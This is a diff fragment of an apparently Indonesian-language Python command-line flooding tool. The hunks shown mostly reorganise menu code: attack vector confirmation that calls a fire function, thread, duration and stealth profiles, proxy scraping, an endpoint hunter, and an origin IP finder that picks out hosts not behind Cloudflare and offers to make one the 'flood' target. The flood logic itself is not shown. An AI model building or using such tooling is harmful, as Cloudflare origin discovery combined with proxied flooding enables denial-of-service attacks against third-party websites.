 
-    # konfirmasi
     banner(f"konfirmasi · {label}")
     print()
     info("vektor", metode)
@@ -1121,11 +1153,10 @@ def sub_vektor(sess, kode):
     p = input(f"{C.G}  pilih> {C.R}").strip().lower()
     if p in ("1", "l", "lanjut", "y", "ya"):
         fire(sess, metode)
-    elif p in ("2", "b", "batal", "n", "no", ""):
-        return
 
-
-# ─── settings ──────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# MENU SETTINGS
+# ═══════════════════════════════════════════════════════════════════
 PROFILES = {
     "light":   {"threads": 30,  "duration": 60,  "stealth": False},
     "medium":  {"threads": 80,  "duration": 120, "stealth": False},
@@ -1175,15 +1206,16 @@ def menu_settings(sess):
                 cfg["profile"] = name
         save_cfg()
 
-
-# ─── menu proxy ────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# MENU PROXY
+# ═══════════════════════════════════════════════════════════════════
 def menu_proxy(sess):
     banner("proxy manager")
     print()
     cached = load_proxies_cached()
     info("cache file", PROXY_CACHE if os.path.exists(PROXY_CACHE) else "(kosong)")
     info("cache jumlah", len(cached))
-    info("status", "auto-load: on" if sess["cfg"].get("use_proxies") else "off")
+    info("auto-load", "on" if sess["cfg"].get("use_proxies") else "off")
     print()
     print(f"  {C.G}[1]{C.R} Re-scrape + health check (overwrite cache)")
     print(f"  {C.G}[2]{C.R} Health-check cache saja")
@@ -1211,8 +1243,9 @@ def menu_proxy(sess):
         return
     input(f"\n  {C.D}enter…{C.R}")
 
-
-# ─── menu endpoint hunter ──────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# MENU ENDPOINT
+# ═══════════════════════════════════════════════════════════════════
 def menu_endpoint(sess):
     banner("endpoint hunter")
     print()
@@ -1258,8 +1291,9 @@ def menu_endpoint(sess):
         return
     input(f"\n  {C.D}enter…{C.R}")
 
-
-# ─── menu origin finder ────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# MENU ORIGIN
+# ═══════════════════════════════════════════════════════════════════
 def menu_origin(sess):
     banner("origin IP finder")
     print()
@@ -1272,25 +1306,24 @@ def menu_origin(sess):
     print()
     if non_cf:
         print(f"  {C.G}host non-Cloudflare (kandidat origin asli):{C.R}")
-        for h_, ips_ in non_cf.items():
+        items = list(non_cf.items())
+        for h_, ips_ in items:
             print(f"    {C.Cy}{h_:<40}{C.R} → {', '.join(ips_)}")
-        # tawarkan set sebagai target
         if ask_bool("set salah satu sebagai target flood", False):
-            pick = ask("host kandidat", list(non_cf.keys())[0])
+            pick = ask("host kandidat", items[0][0])
             if pick in non_cf:
                 cfg["host"] = pick
-                if cfg["port"] in (80, 443):
-                    pass  # keep port
                 save_cfg()
                 print(f"  {C.G}»  target sekarang: {pick}{C.R}")
     else:
-        print(f"  {C.Y}[!] tidak ada host non-CF — origin mungkin juga di-proxy atau di-hide{C.R}")
+        print(f"  {C.Y}[!] tidak ada host non-CF — origin mungkin di-hide{C.R}")
     if cf:
         print(f"\n  {C.D}via Cloudflare: {', '.join(list(cf.keys())[:8])}{C.R}")
     input(f"\n  {C.D}enter…{C.R}")
 
-
-# ─── menu info ─────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# MENU INFO
+# ═══════════════════════════════════════════════════════════════════
 def menu_info(sess):
     banner("info")
     print()
@@ -1303,8 +1336,9 @@ def menu_info(sess):
     info("log_dir", LOG_DIR)
     input(f"\n  {C.D}enter…{C.R}")
 
-
-# ─── menu utama ────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# MENU UTAMA
+# ═══════════════════════════════════════════════════════════════════
 def menu_utama(sess):
     banner()
     cfg = sess["cfg"]
@@ -1330,8 +1364,9 @@ def menu_utama(sess):
     print(f"  {C.Cy}╰──────────────────────────────────────────────────╯{C.R}")
     print()
 
-
-# ─── main ──────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════════════
 def main():
     load_cfg()
     sess = {"cfg": CFG}
